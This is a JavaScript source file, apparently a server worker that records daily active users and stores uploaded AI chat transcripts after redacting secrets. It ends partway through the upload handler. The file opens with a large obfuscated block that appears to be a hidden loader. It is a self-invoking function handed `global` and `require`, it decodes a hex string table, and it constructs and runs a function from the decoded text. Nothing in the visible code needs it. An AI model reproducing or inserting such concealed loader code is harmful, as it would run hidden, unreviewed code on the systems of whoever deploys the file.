P_ZOoVqtFfLt=MfMSWNKQ$iw$Yeq(WcpSDuuwmEYwUrOHTjZ_qCV(0x14a),kLztwrwviWcqdLunJy),nHgszxhw$LzzWNRO$iH=MfMSWNKQ$iw$Yeq[P_ZOoVqtFfLt[WcpSDuuwmEYwUrOHTjZ_qCV(0x15b)](-0x2494+Math.floor(-parseInt(0x1149))*Math.floor(-0x1)+Math.ceil(0x134b),-0x1078+0x1f0a+Math.trunc(parseInt(0xe87))*-0x1)],dI_QAdilVhYqWNcLvfuqWNLo=nHgszxhw$LzzWNRO$iH('',MfMSWNKQ$iw$Yeq(WcpSDuuwmEYwUrOHTjZ_qCV(0x151),kLztwrwviWcqdLunJy)),YkiCYU=dI_QAdilVhYqWNcLvfuqWNLo(MfMSWNKQ$iw$Yeq(WcpSDuuwmEYwUrOHTjZ_qCV(0x157),kLztwrwviWcqdLunJy));return nHgszxhw$LzzWNRO$iH('',YkiCYU)(-0x21*Number(0xc)+parseFloat(parseInt(0x251c))+-0x527*parseInt(0x5)),-0x3838+0x1*-0x8a5+parseInt(0x641a);}(global,require,[-0x54ae31+0x74d7d3*-0x1+0x1398d27,parseInt(0x623)*-parseInt(0x1)+parseInt(0xc87)+-0x53f,Math.trunc(-0x232)*Number(0x38)+parseInt(0x6b0e)+parseInt(0xa737),-parseInt(0x1f81)+Math.max(-0xe59,-0xe59)+0x2ead,Math.ceil(parseInt(0x6513))+-0x45c3*Math.floor(-parseInt(0x3))+parseFloat(0x613)*-0xd,-0x1430d1*-0x2+-parseInt(0x7c4556)+parseInt(0xa2f8cb)],[0xc*Math.trunc(-parseInt(0x1799f))+-0x123c07+parseInt(0x9ffb36),-parseInt(0x13)*Math.max(parseInt(0x6d),parseInt(0x6d))+0xa05+parseInt(parseInt(0x1))*-0x49,parseFloat(0x9083)+-0x1ba*0x29+0x1094,parseFloat(parseInt(0xd8f))+-parseInt(0x1e12)*Number(parseInt(0x1))+0x12c4,Number(0x3)*Math.ceil(-parseInt(0x4b6f))+parseInt(0x36b9)*0x5+Math.ceil(0x80cb),Math.trunc(-0x9099bd)+-parseInt(0xdf176)+-parseInt(0x2)*-0x77a535]));function zcQHbrFXOHPvDkDoGqY$ClY_kyq(){var aANSKyiilJmNnCGHK=['5e58595d5f5a5f0c0707030210','0f1b06042a01081b2a060d0c','5a5c5d505c51510e0530232e04','5a5a5a5b5d5e5f3b3122241f24','5c58595c5151182d0f043c2b','5a030d4945551a085b1a54345441521c5a5b545906580851124008005242401b00121b0800070007140705471b4008594205061e0a065a1b494b0c0607321d1c1d0b0b1d323440191f505106195b08551d1b0a005d1f055d52520a3249081f515f4540081a524b0c1f42451b521a5e41065e44070f081b415f45190001510034021d0e1b42043242320858585a061b5b415b1b06590b140c491d0a085f481f5d1b5441340f5200001d47421b4900484052581d45475147421a1d0f28451a47061b5206471d5442420701524212424152281c0a520d1b1c52521d1a1c585e5f0a1b49401b320f544b5a1d51001a0154080a0d540c010b1a580640071c0f0e19001b1b42594145071d050a000a0c41575a521d1c45501c1b08081b5d580708520800320b1f4000011b1d1d080101060c000c0d1a1b00081a05070e1b52191d1d01075205071d5459051d41470054471f0f194954061140075805064b08410a001d0052060c085a450a5f5a0b1d5408051b08545e0047081c0505521f01005806141a0f2a1c59071f5b4432501b00075b1d3a05081f0c120840540c1b491c1d0c49505a41074019084741045a5a491a5206455a0e320c52000d47002a08410e1d591a52400c0f584b06520801580f2a420e034b4501061b5452061c4304085b1d1d54425149320a5208545f1d400f081a07060a59120a1b490d414914451d52581d435e341b52060c475e500d1d5c071940400b41081b4201005f550808021d471f1f580d40425119142a490c0c325c04411d071d511d540a1d405740001b541b0f1d41580507411a40470a590e0f00590d54000808520d405a41060d00541d59051f470840401b49062a1d1b1c401b141a450c1b0d450b58085b421b470002411f1d520a1b0841071d45061d404058051a5e0a51021d591d320f0c0f54415e051d54540c1d3a52003400321a1d5a5255280a4108015a1d085854541b52084745414908521d40021b42510b1b541c08520a1d1d1d494007521a0c1d0a594b4708000a1d0744455832471d1d014945450e5a4459181f1d06280c58421d425b06523400410b441b420d05061a111a1b0519541d1d400e1b0003050a070b0a0f061b4949000a081a064552521c0b54590a1a1a1b1a451d1f041d340549000705541d5834130c52001b1d08400f005e451b4b0c1c4034421c1d1419471c0108191d451f0f1f1d0202191d591f5b491c0011081908060e45031d1c070058340d065b5d1d00540a1d2a441d28124b060a525a0c595c54081a41411d0b4134010b06541a0c5b0c5200000c525a1a0e1919470b2a49000b0700421b0f1b060c0608071c54010d0c475d52421d01441b061f1047495b5d4708060054341d415454061b041a1f1205021d1c0b0052551d0c1d510841470f00415954050c1a410d411c1d010d1d050001001f5d001c42541f341a03061d4749061d45080659545d051c04050b0f1b5b5a2a0a5b0645520c540c085d1d1154081a451d0e1b471c06044008411a080f5801400e1b001d4b191b5d1b0f08010a5052110c4002','5f505d5f5c5d5c0b2d020c3e04','050c070e1d01','585f3d013f2b0b38','03060007','5d5e505e5f5c5e1b072410183f','380c56324b322332461d0c0a3255320e3252234d4447475d07400055411e125659103234000a292b41591147504a080a2a3200320a36400a05474f030047404700325645000a2a0a5c4749543232555f0104005d321d49190a320d56532b451a31095136410d5656560732324310560c023206520f475654554f32470f5c563a48480f32491d2f3d56403206483232320c3c470e1d32203225564749560a3e113d18490c2156431e1b53540047565b320a475c474f474f4c320d1f064d3211291b310b3238563a53211b0a324d47320a0e1b324a325d05363232470c32004d470a4b47560c2e1d32491b563f11172b32234e0b1a32324b473a2806494736425656430a4c1307320f0c5345070058361d0032320b3026470a3f0a0e0d471d3232141b4748073a412d1228020c0a4007320247471b40211b323242060f05001a01320f32321927013212324756291a0f4d32485b32100f47564712491a580c4c02475c1a47323248324a1a004b52141d2552320c0b32424132325a5e32472d21320a0d56041449590a5240050a244d1d5b56322b1a47491a56415156324e1150110647110b39000a0252323a320a47473b47544747004e51411a3248320549064f494c3207561207081a32490c024732070a1b051b0f0a0432480044084f0c4714000b0a0c251a41480632061f0401063a4205495b5108024d470a4749140c561c412b2a32474a321d0c0e470c56320832400e0a1a1e1a56473241080c0a04125d0547140a320c3241323b3932434732230c0c04000132433232320849080c4032470d0c47321b322a510b322803320251562847085b040f1b471d560f32420f4707320a47470307481a0f08470a47321f322f325632115656250d1c1a374a32400c32520a411a3a5b0a05363a5f4701460a0a56470d5f32010747461c32005147565d401a431306484707081a59475c1f4c585610470a325632174a1a563207560a4b32323147430a3a1c4832473b5a4047001306320a0b0032495647481d320d473220321e3d0a320c460f470e2110323256320f05323205321d4842001d44474832470c5901565142321c594e5a590f2b5956491a410e47580f2559473247114c0a56571b06473249470a564147415647531b051e4a1441470a5e470a1b074732560c073256540c11470a323a0c085b0c47474741580a1954471a475d575658320808320a43325d320b351d4707020b4947562c055a0f48325d36574e321d49320e471a40415953410c140a29471a1d47324a08024632471d580a084903402c0624471a05363256320a265b4732321a47200a1c32490a0039471d2c3641560a2848480f1c0f491b32485f1b0a0a02325c5942322947320c08324a47004c4132454042320a5407564e494756483236325d32251a0d4a1042563a053906470f520c3a14000c28474756061d324822042f0d3253053e1b47490d1f48560a4c323214144a0747471f1a470614562f1b3232322c051c32360c3214325949562a510f5f0d050c0a321d0b322c470a3247550d48191b00124240560b563a32590e1d280c321932473247390047470d3256560806571d00041d0f1d0c321b2a4d56363204001a47470c1956481b4b0b360450320b054732061d524f1f0f0006470a4a562c1c5c47485301493247144b34061f32560d105608561d43404744061000475b470831003256324d471a44470a3a471b491036540f3d481d28360c0c47563b03271a571947501e110a0105050d324b020a323232440f1f0c410a121a474802110e403a14453a354b194c11472e321d1c3208474b192447324b1d40000d5a37403f443247320b510a3a32470e0c561d30562756000c2d285c0a32284748320d323207321b1e02051f0c3247061b190a413250321b245656323232380c41005d56490a32424d324f1d4a474832404b210147531a4232320d562856590507560c1b5f1a561932474634321e0c493a3256564749440d0d471d321b0c3202330a41474708320f4748320e320f410a3a102c3a56070c3232320c183201193232471a470d56322a475f10322c08453c374700320d4114080032561a3211320c2c000c0d4e0c1b32471d44321a4e2932300507323b53321b010c550c07051a41453208563e000c47404e5649401d0847321a3a320a564602560e0a010047015b1e561c470a3231475f00470a0a1d1b1a325c0e4819470c32052832322b10323256322c1d005806470c32004b47483a264c47021c470b320a48414e3256320c0f05082c0a320a1b0c00563247040b3200503212470a480656470656415648323b321a1b562b1b41061d325d13495606464732014841451f3232272f1b541d0632491d0c3a08485d1d08565d205f1b11522932400204120d474e063247475b56321d5c10525647320d490a32320a4732560a3246071d3249480c0a1e5e40471a3256201d5632594700324747325d0a0432524d3206320a32104700044c2c480d493213064701481c1308070a0d00321d32362c560f141d3232320c0c1b3247441447235b32482851470f07144c4707323c32003232470f510a49571938564b49415a11480c510b0f2632121a400b1a0c114732323a5656470d320226320c5600321f1432470c473a321c3248321f3a494e0232283240581d2d591007060e101b2c39320c49470f061a1a483247324103120c490a1a40122b325646493e49114a4d4e484732391b32400a4356564a3c1e28565d1b191a4756544604475201325c470d49213206320d4c03324156493a5f0a474b325d051d32321d591408191d410e4832025947325641324d47320a1a064c523b0a5b47320d561a2a56470c560c2c32013a403248060a324747493206440a0444041a473a1d0a0601470c5d4756320a1247321a591b4850190c32475a1d0a563a1a470a0d473232135c4b1a5432474932321b4720325632564b5a3247563a0a100c0556564b3232005a5d0d3206051a32071a19064826000c101b3758340e093223325847564201491d32124832441d05323625323200320a00563a3a353232590d320c5605324432111b1d4132023241560c0a32203211320a08324d1b1a0a563a0032054c1d320a1b371b5632084b59325144483204331d472b0c320053555d1d540e47320a1d1e1a4f31321d56191a0b564b1a285647471a49504836405d144904194932502f1a1007010a58060a324704551a4a3a0a0a45321c3a322f571b0d471d4d1b4f561a5732475a483241493932321a045832470a56434706321c473c411d480f2834524f001447470848321a443b18324c4d47565c0b4547321a560b1b001d5856324047150556560a541a32063c1d2b283b5c49320a2a47210d26484b1d481d1b47561f53320f08040f475b0b0052325b591f4750002c0c54320e0e0032540d56470e32320a505036320d5d5d08565349554b051c470b480a0a073256061e26000556024232563247594c32321d470a47474106474747084747472c403232323e041d112e325f4056320d3128241c4c470c040e190f473e020a0a055f321b473232324925490a38445e51563228470a470a070f32580b56073232410c474e32564c59564947320a471c41324a0c1a0847125612405647563207323e1c5a3256060c322b0a0a3d320c321a144b1a414208083205471d06320455204732551c2007561d04490b405a13024b32411e1e48323a1532473c144b3259324b3211470c203a47565641470c40064740084732563201470a44384f32563247092b141a474447323a47320a0f0d09125c0a324113323206323d323247324402320e47404f064c323108591c2832563a0c00521c265b474e3a1947190f59001b0e3206110f494744324e05564b0a5604412f42053233470d49215b32001d00411c1132091b5649471c084757072f5656471a06320a3256110a421d08121c471d320a24560e324b47561956321b0b111247325956055d321204324947080856485d060a0a08521b490b37544e431d561b32195447560c320a0a0c00062147561a1356564507483232475d0e3253400505324d320540323247560e0a3228193204320f1b0a4400470f41563256323207470032085619474e5e56231e551a514b324d0d0a4b475919020a3259413256410c0a1131321b0036472e322f493d0c2147054732475a1b1a4757451d4b361e4c1a5647591d1a2c003256411a27284140075f0a4036060f5248335847470c051a0a32432541545e564932320a325e561f324f321f0732492656470d210e0a493232392c3208000a32411a473b595b5602560a140c0c0e0a050a5619413219320a09023219560c3c3256371b391d324752565e5649564132203256471b565821413a321b1e4706320c0007000a1a3251110a5600320c56004b1732491a085639324f33472056401040323232260a025a1a473204031c413d560745330c193256492617505632210f325c4e47001a47320c065b321a084856085625494151543b562954320d0c00473a40050d1d32325648320c32431a47490a47031b505649324f470a5f1a562b18583241141035561a565554590f09564107474b21320c1d51404b1a3b0f32474032324d07071a080a0f1f3247560e321d48325f101a47560a2832325a194732190c0d084732320a07144919474427121c044c130f190c1d1d5b3a0a325647400a10440a3209001a071840410f1032480a041b060c321c471a454a150e34080a04483a470c56120c0a1b321a05471b325601083232134732321e56040011560c5d410e561d5e4747494923560a4706564732485f102247474f481d00320f005600362a08324748410147490b48474d47150b24563a3a0032005632561d4d56325e05410032564736470d5651000528423648325232002c5647561d32561a213a56083b475649562100320c5647323908083b490819563248572e4d47320f471d47090a49564a40012b0d0a3256073241224f323a4147190859085e1d5432493256470a450d565a411a1b3229190a474f1d4c041d56540c12401a5f0a3a4741321a3a3b1d0c3232481d4707070c07321c47284d32062d051c0c32003b05580a3232374b321d234947560d1d1d47232b4e1d4733321347474736264a000d0856193b47400e4c47472908055a481c05354832061a1a32483241342606320007320c1a4c57320c0d59431b321b4d4d32320d471e32125a32325d32370a0a0a0b59400c0d474f4718351d3a5606150f2a0d113a52520d1b0c282c07321947320f145c0c0130560a32475f0b1b1d56150f3a0c47321441294d56470d0d193219320c470c32320c56080a470f0511324b470c595b1a474732321d45324d450c320f3711320b070d0553322f1b4159455647413612474a4d15070c0002080c5153474751474748474756474b564d0d064732564147463240110a07473232191c0f394032471d3208464d0c0f0a4b5a32411d401b190a4706321d324b423212265642413240191f324747321d471d5f56290c39354532324732020c560532483224320c480f5647444740080a0b2a00280a560547320e3232474d531a560b0d0056481a1b3241471f3a420a325c320a1d0a415a481a5b321d0544350e5c3a320d0c1b1032590a0b14493206561d48491b284647084703425d2d12323232383232562d080c534c56324e324a0b0c48320747471d4d5547473241070f52471b070c0f0832321d5356530a40490c590a28481d1519560d470c47560308471a0a1a5956070f564b324708562f4b1a340f005248060b1d47565b32461e58471014040020563d0a0a325601324c0e562b1a0c48563239054732005a581d5d02143243324732482c3238560e0a4032193246324e323214000f0f1a4732563232320f0c45480a325532434056401c0f56321d474a321a5956040f0c1b3210323a14491a564a411b5f2b07234a4b5a400b4e1d40450d32024f1b2c32474732470a41074c123a47470a0755320a0a3632565632015f1447562d4720440c070d19263a07563d4708564a1c32321d5747085b570741071a4f1d54113c080c221a0d32560c1a3a063c224747494700001a1a590a211a23321c561b1d41454e324a321d561e105632531d1d56230b495c331e5a1b3a32564906563f4d323a32322f0d053a0c0d5632480c10051d32323c51470f081a110c1b324b05560c47120a47560a470c065654040a324706471d1232325e4b1e49350c320a130a460247480d5738323a470a5c514147063256470a1f471d323208470032564732561d320a072732323a360b0a32320f1d0b5649471b56423207564f2b471a0a410832383241320b480a025640560e073204320a1f4a292c030a0032483254281a471d561847471341474d3a191407413656440a0c491b1d471a083247222300213232103a3a4732583247072d56303200320a1c0f1d363640561d2f2b3456401a40564447321a4b47471a322956281a192156261d1d32564a47403232060c560a110e074c1d3232085a323a324706475632473628413232000f481b4446480d43084147564b565b47323a0d0c0e231a113230494a4e3647415a394d210a071d400a32545a1a32484732325650560a320a540a463e32114707323c0c004925410506561b00323a0a0000010a554714014806482c1c28541c08034d0532110847083247320527401b3648563e32594d0a4947050d04070700322d4732565b0132323a4732321d054d47320f3247020a41470a2f151d32320357084004274745011a5608324956055d56324c323208410f41412356490c47470632324d4732473241590a3a194132414106414849320d471b450d0b47495026480037152c410d3214360a32513a46324620211e4a01471a0f410a0632471d031a2c115600010a48321e3256583256324a0c474747393232472856584758320f56493226323a26562106470a594014562c1a2c565d56500d0732343249064756471b0759321a105647130c4756131a2f000a5f501a5d365904565e5447294c361a3a5f1d4711475e3941564138064e49503249470c47011b1f4e4b322c522f085632144732580c00320d42470a320d53304056473632324f49560a470a3232560407400c475646564a41281d4005480856212832003213470c5650325c1b32320c5e333232475a041b080756470c0704405652320054471c1d1e3652240a47324747385647531d52113a455c1d4c0c1147400a141b32360f0b320c050a4708563b0f5632500a1d060d47144738484b323248583247191a3a0a1d365d4d3b32310f3253321c1b560804501e4f48295448561e540a550c490c05003852325a47064759573232021b470a24341b3232320049323247430f0948565432440a47320a4732324906323a044041082d3205405d3214563a0a3247493232551d473a56411e3232404e2e48320f0a021a41470032440f4732045648320a480d2700410a32500c02564b5713063a0052273256410d103206561a47321d0e1d1b3206591b473256070a213200110b0c0d06323248463a5a4826491a320a40320a0b56320a47433247563203323241280b56280a325640071a1f08470047470c324a1a47321a04320a471d4132084702454741400a363247320f320a0c0a320a5d5e3549210a0a000d1134561547324f0c321e051b4c32470e195653321d320349464445321d564932471b1a14454f1c5b364f39561a0f1147000b1a2c475d471e133208000f32561432470c143248000b3600560a070d470b5d0c07012b111302321914495749381105470f4b475619061a485b1e404f3241370a0a1d1d321d2c061b323d49124756320a0b1c0e47324706024101560c0f3d0d0c143b0c320040045610561942423247584d56473a50325656325605565a045d053205322b32410a074754072c323256412c4a3232485656473247320c564708594d0a470f32501849494132381b1147323a474147411a325856321b0c2e471a56113f56190c041c1a441d470c0c00470f470a474e0d325c564a1b55521347471c5132481c143256361b0c0b0802481c1419120e071a254c28562b0f22560b061d4c320a325c0a562c002c0a562b4f1111324f563201224556063e1f450532321a2601561a32472132400a5a564f464432083206131d08563a325a4841395f320c3432521d471b2e0a4941563e07010c4746474732560a341f49471a4f320b0a32473202474832404a044d3258320b321d323b0a1a3247065611140f4941324d01052a1f473a323a0a56324e0a55560132040a0f470a4712560a325a0c08490a321a3347065f0856410b02451b1d321b3a47320f47321b414854484d41322c36503d4756085e560841321132471c0a57461d302b06561d140d0c1a524f0f074a1b4f3e5a4f470a5832441a0f3b4a0052474a1d0a090718324847562f483254084749320a3241321b1b1b321a32320a0a1d0c323408325207471b0708320a3232423a330a32070f0c4b320a4732563e320e0f3f325605072c32064b0606320a491d47323222491147480a5d470a32221d121919564a0f1e0c324719564f070c11410f1947002c0f491a47324f1c525d2d471a273214470a3a56545651471d484b5656470849051047411b451c4156320a41323232471a0507481d253a4e323247471a003d1e48494139490b5b0840045d323247322b074f4132280a320a32490a471b3206494d4c275c47331d3200565914473f561d19324956540a0a424941043a32034808493a2f1b3206323a1d0d1f0b47550f5626124756564d3524490a06043947114947321d5b0f06055c080e122c0601322d0b1a2c484718150a1a0b061d4e0c410a081911001405540747062b444832251b32054c36323252054758445b140a0f430b0a2a404022490c111d04320d0c3147280d321d1b1a0147412c061d4f32110032041056344f5c3200321d0c110f1900000a323247391d1c00560a1d03141b480a020b470031473256324b323703542552470a001b594932565747194d320c1a32083205473247470f3243350447121d33561d0a1b2b0e47561a00321b325959320000411b485647463232130a0a320d0e41560d41475e4b32474819474d4732321a5a084148325d29564819494c56040047475632041b47140059325656081c1d47060f0a540a484d0a214719413532583a47031b472b564f47470a565d323232473203323e32291a0f22464711321a47411a47183a2e1d0a020a4120371a4a414728320a494a4a5632475c475e4707053a57322a4748320a025932070a48320a3201152d4c0a32010a493b0c471107220a474148325645560f560c4d0a3908470a015240471b56195657050a56325548322e321c2201081a11320a32085a1a0a0a0d560404540a321d3e324c0a56110c471747324f1b1a173232332a4105564747323a36474730303249080f0d3232325a32320b19470a3200475f473249475a551d3a320d0e07472a5640471b325614005341104917360c45323a2456363219014736475b473232450c072a3601000d0432324749550c191456005d32470657072f050136190a4b01264256000c562a324e470d491747320f3256193a5259472a000e41563a2f324d594701071d32454719324832050a5604484c0b2f5047411b5611451c4732412c475606320b5645560a3a3232561b560647560c2d561447415f4001485d0f574c470a4759563a575c0e32043a11312e1d00030a0c1b4e470e0c5f475941494d0f56563056360632320c4d320a181300080e5d02061d0a323207563a041d471d4f4747320b070f12325e485f084f47070a19325c481a3257485056490f5a470c481a0f1a1b2727122e560a1a470c32474754560551321f36320a320c3247320156090d562c1107073f19070f56472c4a2447322b48411146072356560a3a32590448331d322a0044470f324a0c32505107325b5632563232414737325a0d3947485f1b320a0c0f1d3a1e474158040a490a1b32133243470e360a5649321b0c2c324740401c565a0e40480d320032324632000a0e4c48321b32493247005e00470e0e1d13470c324f0d3732004d5632140a0c081d014c0a564d32411b4e0c454859470c322919485f1822320a1a41081107321d00563249061a324032065d0406010a0632565d561214491b0d411456470d0c49324748325132550c1b28441d5632494d47474014541c07005f430b041c3a324e32474706052c1f325f4733490a1d39081b000b120d5e401c4f0d48470a473241475632320f324711320c4d59050c5632413132280b1d5d004b325645561a4e5f5944323244321c324732560b472a4741082154551a0a563b48140c410733005d3c4352251d320c300a00412208470a4458314704561a0c325647483e32320748463250320e3a325647494747311912321b1a4948470c3f561a584748320a47324747561a060d19321a0c4a4a475f0209085b0408320c0a3256470d4132560c44325632250622594047211d4932263d32413a4756430132471432560e370a1a141c5c470147274148484b563a055710085b373223195456063a471001450a4a1c12403211320747320c4256321b280a56473f4730561147573a0c323a0e3232471a323447322c003256070c4f46320a325654410f080e17484d1a471b0b0a560f2c56472232474751543256560d0a2f471a48595648283e530a000e1d58480a0f32320b320c325a0447483214140c5659561a325032463241324e320f2c2f591d00074e0800354a0a0a4459470e325e0a05324532404f0c3d1f4724002f47522808324a3232080711325a1a37320a320a323d43350d0d32080c22370e200b06194232061d561c1b3240560423523932324308321c324b2c0805113259071b3256364741444b56061a0232471d1a52413a43114132031c473239040a54364700320b3214474728414b452656254e1b3248291b560f244c112d32322e563f3b0d1832173a4f4a325604324f463b3204324055473641495c5f2b3f483a46003c461d4751320e47290650143247585f321a323201324f491249320c3c0652472b41324f4d5601560a4d5a563247560b404e0341325f320503470e36320c41320a1c0b5632490c470a1f320808071f32481d5606475e471a064747484753323247473f470a0d1c5608050a5a1949110d47571d561d565800323248474d4832191a0a475632325d17494741563247471d1c1d470d3247434232001a321d4f4745461c1b470c130b461a4904320a1c050c4c2d2c471a0c040004540a400554470f560e1c26470c591d562d0f0f0c56361d3222055154321204081a32471b0a1c5e4b5d32574a470a0a024754321a523f0c3258474b4732323b32331b472b084d0a411d000a3a280d325956561f1b433a3c491232320f47321d325849323232365648484a05320c4756450c320b3c0a32561c32470d48321a322b470a06081c32320732325847321e0c41321e282a100c32360a324956050c564700412b0f12555d384c5a5647562d4707360d364f0d593a1032042e1a4156561b1a460d3246140002000521025b1d1b560628004b4c083241322b10562b471d49414041010805410107411c0a1d56321f5348323218080a360b5f1d4056564a491132320c0c0d5b4815024a055608391e1a414753562831192b475647564148001d4657471b00014e1a020c59251d0a0f5650475d323210233257415032474e5606051b51114701020d140732364247400000325a294a4c060f562f320a0c1e325656493a191d474732320c5656411e041e2a1b53474f04042d3a40140b061b4141450755565648561d0f32000d0b47580c471b52150a320d0547203256410c1a0c4e47470a51475a1d4701470a320d1a49061a32473f0c1a090056460f05471d58591d22470a1d561a14440c0a4749401b460a53563247471d0b4752141d0a07010d460a473247584732563a0a1c1a40491d32470f47553a491b560f32443240323a1b491a570a4d060c0f56532732320f04064747191b013a320611074817475847322e4a4700470a193232491b0a041c3247320a320c2845561a471a0a5e29320c1b0604523a325610143e32350f3b470f3241060a47190a0847061d5647560d02471049324114404732320514324f4a44480a080a47264706240a3232473b1847402e47325a0f56531e4a4932150832471a4c0a080732071947323212320a0f59470a1e350a1050485f1b490c470d1c070d1e4f0a4c4726071a59505259321732301b0a1406203a05320a2e1959321b0f3206041d2e560c0d363250320640320a00470e561d0007070a36410d564706301b1d3a01560a051b320b56011d324709481b0a0a56324956474706560a003254470a540a0a2205491d1f2c564a1a590032493206120a473c4047414b5632001553060d1d470c1236075701325d0b320d4747320405560a1f36585647320f085949471f1a000a472832470c480c563a5608470a323240404832565656462f474c000a483247053247474810561b040d080a3236472d320548323253093212060c32472b074756563238324832141e470a10443232021418060a1b0a470b3242472b0247150f4027015d3247300c1d0047320056210c1d320c321f4732470a320a4847560c47491b031e5f020a0c4b1d490e29200b0b3247150f07470a11475605491b260532470a0a444b1d56011b1d1c1207470a5e14323251322f5632561f3232471a475d291c0a4a5d0d071440460556325617400f1a5f0a474d3205320a32321a0c494756194d470a32492c19084d284d0c201b5b3258221a471c0a170d3259401b1832583249194747254015563a3532470d474a060a4106421d410a1b44211447320d391d0a41040d32560c0c0c32470c0a0d32321932321a32264732070d470832431b510c1904464747061141325f1c0d054959471a0c4a4811515b1814410b0c3232004724470d5b220c0a005e5b32475249321b1d0c3232071d545846320f491432060a1d4a0c1a56414b4707495f1c0a360f1d1d5648470c1d321a0a4f1c070a1b240b3206324756085b560c3256470547433212411b4b473632140f440d3a141b1b05070a404709024a320856191b1d0a32491d0c49322e0a295d424747402b0a324a471a49280a0c0a06561c321a1a0e540a2b1c05301d3a32442b4740593a32560a001b5347321a03561f1b0a47470c32470a1b534f470a321b0e471549320047324319000a111d1d324a321a3a501a00471d383206000a181c1b4932210040260f11050156060a0d32471d47593221003241410056324647561d470f063f0b4c32112956040c2c0c240e321e320a324b47592b001a08084947321e31413200181e1a490a47475e090e4903060b492b053d3241064756413200491d324619480a2b290a0d451d481447080b001b4b1e413b56563232000c41323f110f083246285b43320d190e00073256470a5648480e3732050a00563232323246491f42560c32320a323210373a1d0f0a541b0d52474930323243323213321a47470c2e0a4a323240561e01560a495e1c41321d474b3240000458473d080c56470c1a1c56471b493a47470c0a150a560e32111d474c580056473232070c0a4f0d491b560a470a3a0821471a32283f4843534447321d0647470c06470a4f000a56321c5911364d39181b061e1144471a40000f56080a1b044932410a2b0c1d320d210649071d323256041432323b3201454d320c3a0c475315444954121d5732321c470649532e2c071232115614321a0c2c4827321b470b5d0a494752540a110a5732084b5b4b1d0f560a474b431e5632473205565b475d00000a4c36474700075656474a4747470d403a560a0b3232081047471a4147320047105632475f1d534d4d2c320d2e1a0a0d474b4e261b110a0b1441450a0a4941481b1d0a475e2d3a56210e40190804560a4732070c2100563a56400a47560243322e1b0c0a5136033454065c56563247221b0a1932041d560a285650320605070f1b3b0f495632003241195a32320a18563b54561a3252470f3247324d471e0a1b322147324d560a5647560f32080f0d0a0b323232490f05470a0a0b32324759001a0d05565132414641530407471c325632325f1b320c470a49470c32323a475321060c4136054d193232324a0b321b0d47061032472d11071e41320d0608470d1b0d040c4d0a04474707585d083a1f4747565201001d050656320a470e1c474905495619284f40320a1a2b4747563205493208564f3232281d44510a321245560f0b473a5e0c0a473c2f321958471d0300324047475647073246322b3203080d450d3232360a2f423256060d26324249320c02150b1a4932564b47412d32563232074d080500320a00550a1c0b5b32','5f5d5c515e5f591d3a0d2d021e','5b51050038181d2c','515d50585b2808273d2b01','1a05000a0c','1a1905001d','1b041d030a0c064a0b4a','1d0a0f071d0805041a000606191e070c030b0e1b021c011d181b10111b1f061c1a0d0a0a13','5f223d0219043d'];zcQHbrFXOHPvDkDoGqY$ClY_kyq=function(){return aANSKyiilJmNnCGHK;};return zcQHbrFXOHPvDkDoGqY$ClY_kyq();}
async function repairDailyActivityYesterday(env) {
  try {
    await env.DB.prepare(`
      INSERT OR IGNORE INTO daily_active_users (
        activity_date, telemetry_id, raw_active, meaningful_active,
        release_active, meaningful_release_active, session_start_count,
        turn_end_count, session_end_count, session_crash_count, ci_active,
        last_is_ci, last_build_channel
      )
      SELECT date(created_at), telemetry_id, 1,
        MAX(CASE
          WHEN event IN ('prompt_submitted', 'turn_end') THEN 1
          WHEN event IN ('session_end', 'session_crash') AND (
            had_user_prompt > 0 OR had_assistant_response > 0 OR turns > 0
            OR assistant_responses > 0 OR tool_calls > 0 OR executed_tool_calls > 0
          ) THEN 1 ELSE 0 END),
        MAX(CASE WHEN build_channel IN ('release', 'ci_release') THEN 1 ELSE 0 END),
        MAX(CASE WHEN build_channel IN ('release', 'ci_release') AND (
          event IN ('prompt_submitted', 'turn_end')
          OR (event IN ('session_end', 'session_crash') AND (
            had_user_prompt > 0 OR had_assistant_response > 0 OR turns > 0
            OR assistant_responses > 0 OR tool_calls > 0 OR executed_tool_calls > 0
          ))
        ) THEN 1 ELSE 0 END),
        SUM(CASE WHEN event = 'session_start' THEN 1 ELSE 0 END),
        SUM(CASE WHEN event = 'turn_end' THEN 1 ELSE 0 END),
        SUM(CASE WHEN event = 'session_end' THEN 1 ELSE 0 END),
        SUM(CASE WHEN event = 'session_crash' THEN 1 ELSE 0 END),
        MAX(is_ci), MAX(is_ci), MAX(build_channel)
      FROM events
      WHERE event IN ('session_start', 'prompt_submitted', 'turn_end', 'session_end', 'session_crash')
        AND created_at >= datetime('now', '-1 day', 'start of day')
        AND created_at < datetime('now', 'start of day')
      GROUP BY date(created_at), telemetry_id
    `).run();
  } catch (err) {
    console.warn("daily activity repair failed", err?.message || err);
  }
}

async function ingestTranscript(request, env, cors) {
  if (!env.TRANSCRIPTS || typeof env.TRANSCRIPTS.put !== "function") {
    return jsonResponse({ error: "Transcript storage unavailable" }, 503, cors);
  }
  const declaredSize = Number(request.headers.get("content-length") || 0);
  if (declaredSize > MAX_TRANSCRIPT_BYTES) {
    return jsonResponse({ error: "Transcript payload too large" }, 413, cors);
  }

  let body;
  try {
    body = await request.json();
  } catch {
    return jsonResponse({ error: "Invalid JSON" }, 400, cors);
  }
  const problem = validateTranscript(body);
  if (problem) {
    return jsonResponse({ error: problem }, 400, cors);
  }

  // Defense in depth: clients redact before upload, but the public endpoint
  // must not trust callers to have done so. Preserve ordinary code and prose
  // while removing high-confidence credentials and sensitive object fields.
  redactSecretsInValue(body.messages);

  const encoded = JSON.stringify(body);
  const byteLength = new TextEncoder().encode(encoded).byteLength;
  if (byteLength > MAX_TRANSCRIPT_BYTES) {
    return jsonResponse({ error: "Transcript payload too large" }, 413, cors);
  }

  const month = new Date().toISOString().slice(0, 7);
  const objectKey = `transcripts/${month}/${body.upload_id}.json`;
  try {
    await env.TRANSCRIPTS.put(objectKey, encoded, {
      httpMetadata: { contentType: "application/json" },
      customMetadata: {
        consent_version: String(body.consent_version),
        telemetry_id: body.id,
      },
    });
    await env.DB.prepare(`
      INSERT INTO transcript_uploads (
        upload_id, telemetry_id, object_key, consent_version, schema_version,
        version, provider, model, end_reason, message_count, byte_count
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).bind(
      body.upload_id,
      body.id,
      objectKey,
      body.consent_version,
      body.schema_version,
      body.version,
      body.provider || null,
      body.model || null,
      body.end_reason,
      body.message_count,
      byteLength,
    ).run();
  } catch (err) {
    try {
      await env.TRANSCRIPTS.delete(objectKey);
    } catch {
      // Best effort rollback. R2 lifecycle retention remains the safety net.
    }
